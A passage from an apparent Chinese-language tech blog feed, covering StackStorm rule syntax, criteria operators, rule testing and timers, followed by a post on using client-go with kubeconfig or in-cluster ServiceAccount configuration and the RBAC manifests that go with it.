optional\rtrigger.payload_parameter_name1:\rtype: \u0026quot;regex\u0026quot;\rpattern : \u0026quot;^value$\u0026quot;\rtrigger.payload_parameter_name2:\rtype: \u0026quot;iequals\u0026quot;\rpattern : \u0026quot;watchevent\u0026quot;\raction: # required\rref: \u0026quot;action_ref\u0026quot;\rparameters: # optional\rfoo: \u0026quot;bar\u0026quot;\rbaz: \u0026quot;{{ trigger.payload_parameter_1 }}\u0026quot;\r上面 yaml 表示一个通用形式 Rule 包括：\nname: rule 的名称。 pack: rule 所属的 pack。如果未指定 pack，则默认为 default。 description: 对 rule 的描述。 enabled: rule的启用状态（true 或 false）。 trigger: 从传感器发出的要监视的 trigger 的类型，以及可选的与该 trigger 相关的参数。 criteria: 一个可选的条件集，包括： trigger payload 的属性。 criteria 比较的类型。 pattern 与之匹配的模式。 action：当 rule 匹配时要执行的 action，包括： ref: 要执行的引用 (action/workflow) parameters: 要传递给动作 action 的可选参数。 Criteria Criteria 的条件是需要匹配的规则（逻辑运算符 AND），rules 中的 criteria 表达为：\n# more variables\rcriteria:\rtrigger.payload_parameter_name1:\rtype: \u0026quot;regex\u0026quot;\rpattern : \u0026quot;^value$\u0026quot;\rtrigger.payload_parameter_name2:\rtype: \u0026quot;iequals\u0026quot;\rpattern : \u0026quot;watchevent\u0026quot;\r通过创建多个独立的 rules （每个 rules 对应一个条件表达式），可以实现逻辑运算符 OR 行为（任何一个条件表达式匹配都会触发 Action 的执行）。\n在这里，type 指定要使用哪个条件比较运算符，而 pattern 指定要传递给运算符函数的模式。在正则表达式情况下，pattern 是一个正则表达式模式， trigger 值需要与之匹配。\n如果 criteria 包含任何特殊字符（如 -），则请使用字典查找格式来指定 criteria 键。在基于 Webhook 的规则中，通常在发布的事件标头中包含这些值：\ncriteria:\rtrigger.headers['X-Custom-Header']:\rtype: \u0026quot;eq\u0026quot;\rpattern : \u0026quot;customvalue\u0026quot;\rpattern 值还可以使用 Jinja 变量访问语法引用数据存储的值\ncriteria:\rtrigger.payload.build_number:\rtype: \u0026quot;equals\u0026quot;\rpattern : \u0026quot;{{ st2kv.system.current_build_number }}\u0026quot;\r由于 PyYAML 中已知的已报告问题，“criteria key”必须是唯一的。这在您希望对相同的 trigger 数据应用不同的运算符（例如 contains 和 ncontains）时有时会变得相关，在下面示例中，仅评估条件中的最后一个重复 key。\ncriteria:\rtrigger.payload.commit.tags: # 重复的key 忽略\rtype: ncontains\rpattern: StackStorm\rtrigger.payload.commit.tags: # 重复的key，需要评估\rtype: contains\rpattern: pull request\rtrigger.payload.commit.message: # 唯一key，需要评估\rtype: ncontains\rpattern: ST2\r在 PyYAML 中，\u0026ldquo;ncontains\u0026rdquo; 和 \u0026ldquo;contains\u0026rdquo; 是用于规则条件比较的两种不同运算符：\ncontains：表示匹配包含某个特定模式的条件。例如，如果您想要触发某个规则，只要 trigger 数据包含特定的内容，就可以使用 \u0026ldquo;contains\u0026rdquo; 运算符。 ncontains：表示匹配不包含某个特定模式的条件。与 \u0026ldquo;contains\u0026rdquo; 相反，只有当 trigger 数据不包含指定的内容时，规则才会触发。 另外，作为一种解决方法，可以使用 “criteria tags” 来多次引用相同的 “criteria key” 。“criteria tags” 使 key 变得唯一，并可以为条件提供上下文。要创建 “criteria tags”，请在 “criteria key” 的末尾包含一个 # 符号和一些文本。在评估时，# 和 # 后面的文本将被忽略。例如：trigger.payload.level#upper 和 trigger.payload.level#lower，如下面示例\ncriteria:\rtrigger.payload.commit.tags#1:\rtype: ncontains\rpattern: StackStorm\rtrigger.payload.commit.tags#2:\rtype: contains\rpattern: pull request\rtrigger.payload.commit.message:\rtype: ncontains\rpattern: ST2\r在这个例子中，由于 “criteria key” 都是唯一的，所有这些条件都将被评估，即使 trigger.payload.commit.tags#1 和 trigger.payload.commit.tags#2 在 trigger 数据中指定了相同的值。使用 “criteria tag” 是为了克服 PyYAML 中 “criteria key” 必须唯一的问题，使得可以在同一 key 上多次引用并且能够指定不同的运算符和模式，从而更灵活地定义规则。\nCriteria Comparison Criteria Comparison 这部分描述了在 Criteria 中可以使用的所有可用运算符。\n运算符 描述 equals 值相等（适用于任意类型的值）。 nequals 值不相等（适用于任意类型的值）。 lessthan trigger 值小于提供的值。 greaterthan trigger 值大于提供的值。 matchwildcard trigger 值与提供的通配符字符串匹配。此运算符支持类似于 Unix shell 的通配符，您可以使用字符如 * 和 ?。对于简单的字符串匹配，此运算符比正则表达式更可取。 regex trigger 值与提供的正则表达式模式匹配。此运算符的行为类似于 re.search('pattern', trigger_value)。 iregex trigger 值与提供的正则表达式模式不区分大小写地匹配。此运算符的行为类似于 re.search('pattern', trigger_value, re.IGNORECASE)。 matchregex trigger 值与提供的正则表达式模式匹配。此运算符已弃用，推荐使用 regex 和 iregex。 iequals 字符串 trigger 值不区分大小写地等于提供的值。 contains trigger 值包含提供的值。请注意， trigger 值可以是字符串或数组（列表）。 ncontains trigger 值不包含提供的值。请注意， trigger 值可以是字符串或数组（列表）。 icontains 字符串 trigger 值不区分大小写地包含提供的值。 incontains 字符串 trigger 值不区分大小写地不包含提供的字符串值。 startswith 字符串 trigger 值的开头与提供的字符串值匹配。 istartswith 字符串 trigger 值的开头与提供的字符串值不区分大小写地匹配。 endswith 字符串 trigger 值的结尾与提供的字符串值匹配。 iendswith 字符串 trigger 值的结尾与提供的字符串值不区分大小写地匹配。 timediff_lt trigger 值与当前时间的时间差小于提供的值。 timediff_gt trigger 值与当前时间的时间差大于提供的值。 exists 在 payload 中存在键。 nexists 在 payload 中不存在键。 inside 触发 payload 在提供的值内部（例如，测试是否“trigger.payload 在 provided_value 中”）。与 contains 的相反操作（其中 contains 会测试“trigger.payload 包含 provided_value”）。 ninside 触发 payload 不在提供的值内部（例如，测试是否 “trigger.payload 不在 provided_value 中”）。与 ncontains 的相反操作（其中 contains 会测试“trigger.payload 不包含 provided_value”）。 search 在触发 payload 中搜索与子条件匹配的数组（列表）。有关更多信息和示例，请参阅高级比较部分。 高级比较运算符 “搜索运算符” 比其他运算符稍微复杂一些。它接受一个额外的条件参数以及应用于搜索列表每个元素的额外嵌套条件。\n条件参数控制搜索运算符如何匹配列表。对于 any 条件，如果 trigger payload 列表中至少有一项匹配所有子条件，搜索运算符将返回成功匹配。对于 all 条件， trigger payload 列表中的每一项都必须与所有子条件匹配，搜索运算符才会返回成功匹配。any2any 条件在任何 payload 项匹配任何条件项时返回成功匹配。最后，all2any 条件在所有 payload 项匹配任何条件项时返回成功匹配。\n以下是使用 “搜索运算符” 和 any 条件的示例条件：\n---\rcriteria:\rtrigger.issue_fields:\rtype: \u0026quot;search\u0026quot;\r# Controls whether all items in the trigger payload must match the child criteria,\r# or if any single item matching the child criteria is sufficient\rcondition: any # \u0026lt;- *At least one* item must match all child patterns\rpattern:\r# Here our context is each item of the list\r# All of these patterns must match the item for the item to be considered a match\r# These are simply other operators applied to each item of the list\ritem.field_name:\rtype: \u0026quot;equals\u0026quot;\rpattern: \u0026quot;Status\u0026quot;\ritem.to_value:\rtype: \u0026quot;equals\u0026quot;\rpattern: \u0026quot;Approved\u0026quot;\r下面内容，这个条件将匹配以下 trigger payload，因为“Status”字段已更改为“Approved”：\n{\r\u0026quot;issue_fields\u0026quot;: [\r{\r\u0026quot;field_type\u0026quot;: \u0026quot;Custom\u0026quot;,\r\u0026quot;field_name\u0026quot;: \u0026quot;Status\u0026quot;,\r\u0026quot;to_value\u0026quot;: \u0026quot;Approved\u0026quot;\r}, {\r\u0026quot;field_type\u0026quot;: \u0026quot;Custom\u0026quot;,\r\u0026quot;field_name\u0026quot;: \u0026quot;Signed off by\u0026quot;,\r\u0026quot;to_value\u0026quot;: \u0026quot;Stanley\u0026quot;\r}\r]\r}\r以下是另一个示例，其中 condition 参数为 all，在这种情况下，列表中的所有项都必须匹配所有的子模式：\n---\rcriteria:\rtrigger.issue_fields:\rtype: \u0026quot;search\u0026quot;\rcondition: all # \u0026lt;- *All* items must match all patterns\rpattern:\ritem.field_type:\rtype: \u0026quot;equals\u0026quot;\rpattern: \u0026quot;Custom\u0026quot;\r该条件也将与上述 trigger payload 匹配。\n然而，以下 trigger payload 不会与 all 条件匹配，因为 “Summary” 字段不是 \u0026ldquo;Custom\u0026rdquo; 字段：\n{\r\u0026quot;issue_fields\u0026quot;: [\r{\r\u0026quot;field_type\u0026quot;: \u0026quot;Built-in\u0026quot;,\r\u0026quot;field_name\u0026quot;: \u0026quot;Summary\u0026quot;,\r\u0026quot;to_value\u0026quot;: \u0026quot;Lorem Ipsum\u0026quot;\r}, {\r\u0026quot;field_type\u0026quot;: \u0026quot;Custom\u0026quot;,\r\u0026quot;field_name\u0026quot;: \u0026quot;Status\u0026quot;,\r\u0026quot;to_value\u0026quot;: \u0026quot;Approved\u0026quot;\r}, {\r\u0026quot;field_type\u0026quot;: \u0026quot;Custom\u0026quot;,\r\u0026quot;field_name\u0026quot;: \u0026quot;Signed off by\u0026quot;,\r\u0026quot;to_value\u0026quot;: \u0026quot;Stanley\u0026quot;\r}\r]\r}\r以下示例是 参数 condition 为 any2any 的示例。在任何 payload 项匹配模式的任何部分的情况下，这将返回 true。此示例使用上面 “condition” 部分中描述的条件标签。\n---\rcriteria:\rtrigger.body.data.tank:\rtype: \u0026quot;search\u0026quot;\rcondition: any2any\rpattern:\ritem.chemicalLevel#1:\rtype: \u0026quot;lessthan\u0026quot;\rpattern: 40\ritem.chemicalLevel#2:\rtype: \u0026quot;greaterthan\u0026quot;\rpattern: 50\rPayload\n{\r\u0026quot;tanks\u0026quot;: [\r{\r\u0026quot;id\u0026quot;: 1,\r\u0026quot;chemicalLevel\u0026quot;: 43\r}, {\r\u0026quot;id\u0026quot;: 2,\r\u0026quot;chemicalLevel\u0026quot;: 55\r}\r]\r}\r上面示例中，由于第二个 chemicalLevel 值超过了50，因此此条件解析为 true，并且将触发操作，例如向操作员发送通知。如果第二个chemicalLevel 为45，则条件解析为 false，不会发生任何操作。\n以下是条件参数为 all2any 的示例。在所有 payload 都与所有的 condition pattern 匹配的情况下，这将返回 true\n---\rcriteria:\rtrigger.body.data.equipment:\rtype: \u0026quot;search\u0026quot;\rcondition: all2any\rpattern:\ritem.latitude.value#1:\rtype: \u0026quot;lessthan\u0026quot;\rpattern: 40\ritem.latitude.value#2:\rtype: \u0026quot;greaterthan\u0026quot;\rpattern: 50\ritem.longitude.value#1:\rtype: \u0026quot;lessthan\u0026quot;\rpattern: -100\ritem.longitude.value#2:\rtype: \u0026quot;greaterthan\u0026quot;\rpattern: -90\rpayload 如下：\n{\r\u0026quot;equipment\u0026quot;: [\r{\r\u0026quot;latitude\u0026quot;: {\r\u0026quot;value\u0026quot;: 43\r}\r\u0026quot;longitude\u0026quot;: {\r\u0026quot;value\u0026quot;: -95\r}\r}, {\r\u0026quot;latitude\u0026quot;: {\r\u0026quot;value\u0026quot;: 44\r}\r\u0026quot;longitude\u0026quot;: {\r\u0026quot;value\u0026quot;: -96\r}\r}\r]\r}\r在这个例子中，所有设备的值都在条件指定的范围内，因此不会执行任何操作。即使将第一个 latitude 设置为 53，仍然不会有任何操作。假设第二个 longitude 值设置为 -106，那么操作将触发，因为所有设备将违反 contition 中的至少一个部分。这可以在最后一个 equipment 离开区域时触发通知。\n单一 payload 模式\n如果 payload 中只需要一个元素，则如果 payload 是字典，则搜索参数仍然可以用于测试规则的条件，例如下面示例，payload 还是和上面相同，但是实际内容不同\n---\rcriteria:\rtrigger.body.data:\rtype: \u0026quot;search\u0026quot;\rcondition: all2any\rpattern:\ritem.latitude.value#1:\rtype: \u0026quot;lessthan\u0026quot;\rpattern: 40\ritem.latitude.value#2:\rtype: \u0026quot;greaterthan\u0026quot;\rpattern: 50\ritem.longitude.value#1:\rtype: \u0026quot;lessthan\u0026quot;\rpattern: -100\ritem.longitude.value#2:\rtype: \u0026quot;greaterthan\u0026quot;\rpattern: -90\rpayload\n{\r\u0026quot;data\u0026quot;: {\r\u0026quot;latitude\u0026quot;: {\r\u0026quot;value\u0026quot;: 43\r}\r\u0026quot;longitude\u0026quot;: {\r\u0026quot;value\u0026quot;: -95\r}\r}\r}\r在使用 single payload 时，all2any 和 any2any 具有相同的结果，因为选择所有与选择任何一件相同。\ncondition 参数 count count_gt count_gte count_lt count_lte any all any2any all2any 搜索运算符的注意事项 首先，它将规则引擎转变为一个 “递归下降解析器”，这可能会降低规则引擎的性能。因此，如果有一个规则必须保持快速响应，不受系统负载影响，建议尽量避免使用 “搜索运算符”。\n其次，“搜索运算符” 的认知复杂性使其一眼难以理解。如果你与他人共享代码，可能需要详细记录规则和模式，以更清晰地解释你的意图。\n最后，“搜索运算符” 的算法复杂性与其他运算符大不相同，下面是算法的复杂度：\nO($n_{patterns}$) 是指 $n_{patterns}$，即子模式的数量。这表示算法的运行时间（复杂度）与子模式的数量成正比。当子模式数量增加时，运行时间也会相应增加。 O($n_{payloads}$) 是指 $n_{payloads}$，即 “trigger payload” 字段的数量。同样，这表示算法的运行时间与 “trigger payload” 字段的数量成正比。增加 “trigger payload” 字段的数量也会导致运行时间增加。 其中，O 表示的是算法的渐进复杂度，即算法的运行时间与输入规模的增长关系。因此，如果有大量 “子条件” 或者在 “trigger payload” 中搜索长列表，使用搜索运算符很容易编写出慢规则。\n总结：使用 “搜索运算符” 应主要限制在尝试匹配 “少量的子条件” 和 ”少量预期 payload“ 列表项的情况下。尽管搜索运算符可能使规则引擎变慢，但与无条件运行工作流并在那里进行过滤相比，在规则中使用搜索运算符仍然更快且更轻量。\n在Rule中配置Actions的执行 这一部分描述了在 ”tigger“ 成功匹配并满足一组可选条件时要执行的后续 ”actions/workflows“。至少，Rules 应指定要执行的 Actions。Rules 还可以指定在执行 Actions 时提供给 Actions 的参数。\n下面是一个 Actions 的示例\naction: # required\rref: \u0026quot;action_ref\u0026quot;\rparameters: # optional\rfoo: \u0026quot;bar\u0026quot;\rbaz: 1\r偶尔情况下，在规则 Rules 时，将 Tigger 的上下文传递给 Actions 可能是必要的。 Rule 引擎能够通过利用 Jinja 模板语法插值变量。如下所示：\naction:\rref: \u0026quot;action_ref\u0026quot;\rparameters:\rfoo: \u0026quot;bar\u0026quot;\rbaz: \u0026quot;{{ trigger.payload_parameter_1 }}\u0026quot;\r触发器属性的值可以是 null 和 None。这也是相关 Actions 参数的有效值。您需要使用 use_none Jinja 模板过滤器，以确保在调用操作时正确序列化 null/None 值。\naction:\rref: \u0026quot;action_ref\u0026quot;\rparameters:\rfoo: \u0026quot;bar\u0026quot;\rbaz: \u0026quot;{{ trigger.payload_parameter_1 | use_none }}\u0026quot;\rNotes: 当使用 Jinja 模板插值时，null 或 None 的值可能会导致一些序列化问题。使用 \u0026ldquo;use_none\u0026rdquo; 过滤器可以帮助规避这些问题，确保 null 或 None 值在序列化时被正确处理。\n由于当前的 Jinja 模板系统不支持非字符串类型，因此需要此解决方法。在调用操作之前，我们被迫根据操作参数定义执行类型转换。\nRules 的管理 添加rule 如果只为了部署部署一条 rule，可以使用 st2 命令：st2 rule create ${PATH_TO_RULE}，例如：\nst2 rule create /usr/share/doc/st2/examples/rules/sample_rule_with_webhook.yaml\r完成后记得要重新加载所有规则，请使用 st2ctl reload --register-rules\n如果 rule name 已经存在将会出现下面的提示：\nERROR: 409 Client Error: Conflict\rMESSAGE: Tried to save duplicate unique keys (E11000 duplicate key error index: st2.rule_d_b.$uid_1 dup key: { : \u0026quot;rule:examples:sample_rule_with_webhook\u0026quot; })\r更新rule 要更新一条规则，编辑规则定义文件并运行命令：st2 rule update，如下例所示：\nst2 rule update examples.sample_rule_with_webhook /usr/share/doc/st2/examples/rules/sample_rule_with_webhook.yaml\r获取rule 要查看所有规则或获取单个规则，请使用以下命令：\nst2 rule list\rst2 rule get examples.sample_rule_with_webhook\r要取消部署一条规则，运行命令：st2 rule delete ${RULE_NAME_OR_ID}。例如，要取消部署之前部署的名为 examples.sample_rule_with_webhook 的规则，运行：\nst2 rule delete examples.sample_rule_with_webhook\rrule的放置位置 自定义规则可以放置在本地系统上的任何可访问文件夹中。自定义规则通常放置在 /opt/stackstorm/packs/\u0026lt;pack_name\u0026gt;/rules 目录中。\n测试rule 为了更方便地测试规则，我们提供了一个 st2-rule-tester 工具，它可以在不运行任何 StackStorm 组件的情况下评估规则与触发器实例的匹配。\n该工具通过接受包含规则定义的文件路径和包含触发器实例定义的文件路径来实现：\nst2-rule-tester --rule=${RULE_FILE} --trigger-instance=${TRIGGER_INSTANCE_DEFINITION} --config-file=/etc/st2/st2.conf\recho $?\r两个文件都需要以YAML或JSON格式包含定义。对于规则，您可以使用计划部署的相同文件。\n对于触发器实例，定义文件需要包含以下键：\ntrigger：触发器的完整引用（例如，core.st2.IntervalTimer，slack.message，irc.pubmsg，twitter.matched_tweet等）。 payload：Trigger payload。负载本身是特定于所讨论触发器的。要了解触发器结构，您可以查看包的 README 或查找位于 packs/\u0026lt;pack_name\u0026gt;/sensors/ 目录中的 sensor 元数据文件中的 trigger_types 部分。 如果触发器实例匹配，将打印 === RULE MATCHES === 并且该工具将以 0 的状态代码退出。如果规则不匹配，将打印 === RULE DOES NOT MATCH === 并且该工具将以 1 的状态代码退出。\n以下是如何使用该工具的一些示例：\nrule.yaml\n---\rname: \u0026quot;relayed_matched_irc_message\u0026quot;\rpack: \u0026quot;irc\u0026quot;\rdescription: \u0026quot;Relay IRC message to Slack if the message contains word StackStorm\u0026quot;\renabled: true\rtrigger:\rtype: \u0026quot;irc.pubmsg\u0026quot;\rparameters: {}\rcriteria:\rtrigger.message: # 触发器的message值\rtype: \u0026quot;icontains\u0026quot; # 不区分大小写包含 pattern 的值\rpattern: \u0026quot;StackStorm\u0026quot;\raction:\rref: \u0026quot;slack.post_message\u0026quot;\rparameters:\rmessage: \u0026quot;{{ trigger.source.nick }} on {{ trigger.channel }}: {{ trigger.message }}\u0026quot;\rchannel: \u0026quot;#irc-relay\u0026quot;\rtrigger_instance_1.yaml :\n---\rtrigger: \u0026quot;irc.pubmsg\u0026quot;\rpayload:\rsource:\rnick: \u0026quot;Kami_\u0026quot;\rhost: \u0026quot;gateway/web/irccloud.com/x-uvv\u0026quot;\rchannel: \u0026quot;#stackstorm\u0026quot;\rtimestamp: 1419166748,\rmessage: \u0026quot;stackstorm is cool!\u0026quot;\rtrigger_instance_2.yaml\n---\rtrigger: \u0026quot;irc.pubmsg\u0026quot;\rpayload:\rsource:\rnick: \u0026quot;Kami_\u0026quot;\rhost: \u0026quot;gateway/web/irccloud.com/x-uvv\u0026quot;\rchannel: \u0026quot;#stackstorm\u0026quot;\rtimestamp: 1419166748,\rmessage: \u0026quot;blah blah\u0026quot;\r下面使用 trigger_instance_1 来评估rules\nst2-rule-tester --rule=./my_rule.yaml --trigger-instance=./trigger_instance_1.yaml\recho $?\rtrigger_instance_1 输出的结果为\n2015-12-11 14:35:03,249 INFO [-] Connecting to database \u0026quot;st2\u0026quot; @ \u0026quot;0.0.0.0:27017\u0026quot; as user \u0026quot;None\u0026quot;.\r2015-12-11 14:35:03,318 INFO [-] Validating rule irc.relayed_matched_irc_message for pubmsg.\r2015-12-11 14:35:03,331 INFO [-] 1 rule(s) found to enforce for pubmsg.\r2015-12-11 14:35:03,333 INFO [-] === RULE MATCHES ===\r0\r使用 trigger_instance_2 来评估rules\nst2-rule-tester --rule=./my_rule.yaml --trigger-instance=./trigger_instance_2.yaml\recho $?\rtrigger_instance_2 输出的结果为\n2015-12-11 14:35:57,380 INFO [-] Connecting to database \u0026quot;st2\u0026quot; @ \u0026quot;0.0.0.0:27017\u0026quot; as user \u0026quot;None\u0026quot;.\r2015-12-11 14:35:57,444 INFO [-] Validating rule irc.relayed_matched_irc_message for pubmsg.\r2015-12-11 14:35:57,459 INFO [-] Validation for rule irc.relayed_matched_irc_message failed on -\rkey: trigger.message\rpattern: StackStorm\rtype: icontains\rpayload: blah blah\r2015-12-11 14:35:57,461 INFO [-] 0 rule(s) found to enforce for pubmsg.\r2015-12-11 14:35:57,462 INFO [-] === RULE DOES NOT MATCH ===\r1\rst2-rule-tester 进一步提供了一种事后调试的方式，您可以回答一个问题：“为什么我的 Rule 没有与刚刚触发的 Trigger 匹配？” 这表示着已经在 StackStorm 中加载了一个已知引用的 rule，类似地，还有一个带有已知 ID 的 Trigger Instance。\n假设我们有规则引用为 my_pack.fire_on_execution 和 Trigger 实例 ID 为 566b4be632ed352a09cd347d：\nst2-rule-tester --rule-ref=my_pack.fire_on_execution --trigger-instance-id=566b4be632ed352a09cd347d --config-file=/etc/st2/st2.conf\recho $?\r输出结果为\n2015-12-11 15:24:16,459 INFO [-] Connecting to database \u0026quot;st2\u0026quot; @ \u0026quot;0.0.0.0:27017\u0026quot; as user \u0026quot;None\u0026quot;.\r2015-12-11 15:24:16,527 INFO [-] Validating rule my_pack.fire_on_execution for st2.generic.actiontrigger.\r2015-12-11 15:24:16,542 INFO [-] Validation for rule my_pack.fire_on_execution failed on -\rkey: trigger.status\rpattern: succeeded\rtype: iequals\rpayload: failed\r2015-12-11 15:24:16,545 INFO [-] 0 rule(s) found to enforce for st2.generic.actiontrigger.\r2015-12-11 15:24:16,546 INFO [-] === RULE DOES NOT MATCH ===\r输出还标识了不匹配的来源，即是 Trigger 类型不匹配还是其中一个条件不匹配。\n如果您正在调试并想要查看发送到 StackStorm 的 Trigger 实例列表，可以使用下面命令：\nst2 trigger-instance list\r还可以按触发器进行触发器实例的过滤：\nst2 trigger-instance list --trigger=core.f9e09284-b2b1-4127-aedd-dcde7a752819\r此外，还可以通过使用 timestamp_gt 和 timestamp_lt 过滤选项，在时间范围内获取触发器实例：\nst2 trigger-instance list --trigger=\u0026quot;core.f9e09284-b2b1-4127-aedd-dcde7a752819\u0026quot; -timestamp_gt=2015-06-01T12:00:00Z -timestamp_lt=2015-06-02T12:00:00Z\r请注意，您还可以指定其中一个 timestamp_lt 或 timestamp_gt。您可以使用 get 命令获取有关触发器实例的详细信息：\nst2 trigger-instance get 556e135232ed35569ff23238\r在调试规则时可能很有用的一项功能是将触发器实例重新发送到 StackStorm。您可以使用 re-emit 命令来实现这一点。\nst2 trigger-instance re-emit 556e135232ed35569ff23238\r定时器 - timers 定时器 (Timers) 允许基于定义的时间间隔重复运行特定操作，或在特定日期和时间运行。您可以将它们视为 cron 作业，但具有更多的灵活性，例如仅在提供的日期和时间运行操作一次的能力。\n目前，我们支持以下定时器触发器类型：\ncore.st2.IntervalTimer ：在预定义的时间间隔（例如每30秒，每24小时，每周等）运行一个操作。 core.st2.DateTimer ：在指定的日期和时间运行一个操作。 core.st2.CronTimer ：当前时间匹配在UNIX cron格式中定义的时间约束时运行一个操作。 定时器被实现为 Trigger，这意味着您可以在 Rule 中使用它们。在下面的部分中，您可以找到如何在规则定义中使用定时器的一些示例。\ncore.st2.IntervalTimer 使用示例 可用的参数有：unit 和 delta。\n对于 unit 参数，支持的值包括：seconds、minutes、hours、days、weeks。\n每30秒运行一次Action ---\r...\rtrigger:\rtype: \u0026quot;core.st2.IntervalTimer\u0026quot;\rparameters:\runit: \u0026quot;seconds\u0026quot;\rdelta: 30\raction:\r...\r每24小时运行一次Action ---\r...\rtrigger:\rtype: \u0026quot;core.st2.IntervalTimer\u0026quot;\rparameters:\runit: \u0026quot;hours\u0026quot;\rdelta: 24\raction:\r...\r每2星期运行一次Action ---\r...\rtrigger:\rtype: \u0026quot;core.st2.IntervalTimer\u0026quot;\rparameters:\runit: \u0026quot;weeks\u0026quot;\rdelta: 2\raction:\r...\rcore.st2.DateTimer 可用参数 timezone, date.\n在指定时间运行 action\n---\r...\rtrigger:\rtype: \u0026quot;core.st2.DateTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rdate: \u0026quot;2014-12-31 23:59:59\u0026quot;\raction:\r...\rcore.st2.CronTimer 此定时器支持类似 cron 的表达式。\n默认情况下，如果没有为特定参数提供值，则假定为 *，这意味着在每个值上触发。\n可用参数 timezone, year, month, day, week, day_of_week, hour, minute, second，注意，时区(timezone ) 使用 pytz 格式 例如 Asia/Shanghai.\n每周日午夜运行action ---\r...\rtrigger:\rtype: \u0026quot;core.st2.CronTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rday_of_week: 6 # or day_of_week: \u0026quot;sun\u0026quot;\rhour: 0\rminute: 0\rsecond: 0\raction:\r...\r每天午夜运行action ---\r...\rtrigger:\rtype: \u0026quot;core.st2.CronTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rday_of_week: \u0026quot;*\u0026quot;\rhour: 0\rminute: 0\rsecond: 0\raction:\r...\r如上所述，如果没有为特定参数提供值，则假定为 *，这意味着以下内容等效于上述内容：\n---\r...\rtrigger:\rtype: \u0026quot;core.st2.CronTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rhour: 0\rminute: 0\rsecond: 0\raction:\r...\r周一到周五每天午夜执行，但周六日不执行 ---\r...\rtrigger:\rtype: \u0026quot;core.st2.CronTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rday_of_week: \u0026quot;mon-fri\u0026quot;\rhour: 0\rminute: 0\rsecond: 0\raction:\r...\r每小时执行一次 ---\r...\rtrigger:\rtype: \u0026quot;core.st2.CronTimer\u0026quot;\rparameters:\rtimezone: \u0026quot;UTC\u0026quot;\rhour: \u0026quot;*\u0026quot;\rminute: 0\rsecond: 0\raction:\r...\r故障排除 rules 不如预期那样工作？或者只是想看看哪些 rules 已经生效？\n运行 st2 rule-enforcement list 以查看所有 rules 执行。您可以通过规则对此输出进行过滤以缩小范围。\n","permalink":"https://www.oomkill.com/2023/11/stackstorm-rules/","summary":"","title":"StackStorm自动化 - Rules"},{"content":"在我们基于 Kubernetes 编写云原生 GoLang 代码时，通常在本地调试时，使用 kubeconfig 文件，以构建基于 clientSet 的客户端。而在将代码作为容器部署到集群时，则会使用集群 (in-cluster) 内的配置。\nclientcmd 模块用于通过传递本地 kubeconfig 文件构建 clientSet。因此，在容器内使用相同模块构建 clientSet 将需要维护容器进程可访问的 kubeconfig 文件，并设置具有访问 Kubernetes 资源权限的 serviceaccount token。\n下面是一个基于 kubeconfig 访问集群的代码模式\nvar (\rk8sconfig *string //使用kubeconfig配置文件进行集群权限认证\rrestConfig *rest.Config\rerr error\r)\rif home := homedir.HomeDir(); home != \u0026quot;\u0026quot; {\rk8sconfig = flag.String(\u0026quot;kubeconfig\u0026quot;, fmt.Sprintf(\u0026quot;./admin.conf\u0026quot;), \u0026quot;kubernetes auth config\u0026quot;)\r}\rflag.Parse()\rif _, err := os.Stat(*k8sconfig); err != nil {\rpanic(err)\r}\rclientset,err := kubernetes.NewConfig(k8sconfig)\rif err != nil {\rpanic(err)\r}\r这样做可能导致 serviceaccount token 本身被潜在地暴露出去。如果任何用户能够执行到使用 kubeconfig 与集群通信的容器，那么就可以获取该 token，并可以伪装成服务账号从集群外部与 kube-apiserver 进行通信。\n为了避免这种情况，我们在 client-go 模块中使用了 rest 包。这将帮助我们从集群内部与集群通信，前提是使用适当的服务账号运行。但这需要对代码进行重写，以适应从集群外部构建 client-set 的方式。\n下面代码时使用 in-cluster 方式进行通讯的模式\nvar (\rk8sconfig *string //使用kubeconfig配置文件进行集群权限认证\rrestConfig *rest.Config\rerr error\r)\rif home := homedir.HomeDir(); home != \u0026quot;\u0026quot; {\rk8sconfig = flag.String(\u0026quot;kubeconfig\u0026quot;, fmt.Sprintf(\u0026quot;./admin.conf\u0026quot;), \u0026quot;kubernetes auth config\u0026quot;)\r}\rk8sconfig = k8sconfig\rflag.Parse()\rif _, err := os.Stat(*k8sconfig); err != nil {\rpanic(err)\r}\rif restConfig, err = rest.InClusterConfig(); err != nil {\r// 这里是从masterUrl 或者 kubeconfig传入集群的信息，两者选一\r// 先从 in-cluster 方式获取，如果不能获取，再执行这里\rrestConfig, err = clientcmd.BuildConfigFromFlags(\u0026quot;\u0026quot;, *k8sconfig)\rif err != nil {\rpanic(err)\r}\r}\rrestset, err := kubernetes.NewForConfig(restConfig)\r除了这些之外，还需要创建对应的 serviceaccount 来让 Pod 在 in-cluster 有权限获取到自己要的资源，下面是一个完整的 deployment 创建这些资源的清单\napiVersion: v1\rkind: Namespace\rmetadata:\rname: infra\r---\rapiVersion: rbac.authorization.k8s.io/v1\rkind: ClusterRole\rmetadata:\rname: pod-proxier-secret-reader\rrules:\r- apiGroups: [\u0026quot;\u0026quot;]\rresources: [\u0026quot;pods\u0026quot;]\rverbs: [\u0026quot;get\u0026quot;, \u0026quot;watch\u0026quot;, \u0026quot;list\u0026quot;]\r---\rapiVersion: rbac.authorization.k8s.io/v1\rkind: ClusterRoleBinding\rmetadata:\rname: pod-proxier-rolebinding\rsubjects:\r- kind: ServiceAccount\rname: pod-proxier-secret-sa\rnamespace: infra\rroleRef:\rkind: ClusterRole\rname: pod-proxier-secret-reader\rapiGroup: rbac.authorization.k8s.io\r---\rapiVersion: v1\rkind: ServiceAccount\rmetadata:\rnamespace: infra\rname: pod-proxier-secret-sa\r---\rapiVersion: apps/v1\rkind: Deployment\rmetadata:\rname: pod-proxier\rspec:\rreplicas: 1\rselector:\rmatchLabels:\rapp: pod-proxier\rtemplate:\rmetadata:\rlabels:\rapp: pod-proxier\rspec:\rserviceAccount: pod-proxier-secret-sa # 使用上面定义的 sa 进行in-cluster 访问\rcontainers:\r- name: container-1\rimage: haproxytech/haproxy-debian:2.6\rports:\r- containerPort: 80\rhostPort: 8080 # 添加 hostPort 字段\r- name: container-2\rimage: container-2-image:tag\rports:\r- containerPort: 8080\rhostPort: 8081 # 添加 hostPort 字段\r","permalink":"https://www.oomkill.com/2023/11/ch07-in-cluster-pod/","summary":"","title":"client-go - Pod使用in-cluster方式访问集群"},{"content":"本文记录了在 